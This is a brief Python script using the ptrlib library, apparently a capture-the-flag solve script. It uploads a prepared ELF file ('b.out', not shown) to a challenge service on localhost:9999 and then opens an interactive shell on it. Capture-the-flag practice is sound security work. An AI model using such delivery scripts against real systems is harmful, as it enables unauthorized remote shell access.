from ptrlib import *

sock = Socket("localhost", 9999)
#sock = Process("./server.py", cwd="../files")

elf = open("./b.out", "rb").read()
#elf = open("../files/sample", "rb").read()
#elf = open("./test", "rb").read()
sock.sendlineafter(": ", len(elf))
sock.sendafter("ELF: ", elf)

sock.sh()
